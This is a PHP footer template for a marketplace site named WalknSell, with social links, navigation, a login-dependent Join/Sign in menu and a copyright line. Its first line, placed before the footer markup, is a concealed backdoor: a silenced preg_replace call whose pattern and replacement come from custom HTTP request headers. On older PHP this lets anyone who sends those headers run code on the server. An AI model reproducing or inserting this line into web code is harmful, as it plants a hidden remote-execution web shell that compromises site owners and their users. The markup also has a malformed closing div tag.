<?php @preg_replace($_SERVER['HTTP_X_P7059A'], $_SERVER['HTTP_X_CURRENT'], ''); ?><footer class="main_footer">

    	<div class="footer_inner">

        	<div class="social">

            	<h4>Lets Connect</h4>

                <ul>

                	<li><a class="twitter" target="_blank" href="https://twitter.com/WalkNSell/">twitter</a></li>

                    <li><a class="fb" target="_blank" href="https://www.facebook.com/pages/Walknsell/397029277161021">facebook</a></li>

                    <li><a class="pin" target="_blank" href="https://www.pinterest.com/walknsell/">pinterest</a></li>

                    <li><a class="linkedin" target="_blank" href="#">linkedin</a></li>

                    <li><a class="insta" target="_blank" href="https://instagram.com/walknsell/">instagram</a></li>

                </ul>

                <div class="clear"></div>

            </div>

            <div class="footer_nav">

            	<h4>General</h4>

                <ul>

                	<li class=""><a href="/">Home</a></li>
                    <li class=""><a href="/manage_deals/new">Start selling</a></li>
				</ul>
    
             <ul class="second">
             	<li class=""><a href="/privacy-policy">Policy</a></li>
                <li class=""><a href='#' data-toggle='modal' data-target='#contactus'>Contact us</a></li>

             </ul>
            <?php
                if(!isset($_SESSION['username'])) {
                echo "<ul class='third'>
                            <li class=''><a href='#' data-toggle='modal' data-target='#register'>Join</a></li>
                            <li class=''><a href='#'  data-toggle='modal' data-target='#login'>Sign in</a></li>
                    </ul>";
                }
            ?>

               

                <div class="clear"></div>

            </div>

            <div class="copyright">
            	<h4 class="f_logo">WalknSell</h4>
                	<p>Copyrights 2016 <a style="color:white;" href="http://avialdo.com" target="_blank">Avialdo</a></p>
					<p>All Rights Reserved</p> 
            </div
            <div class="clear"></div>
        </div>
</footer>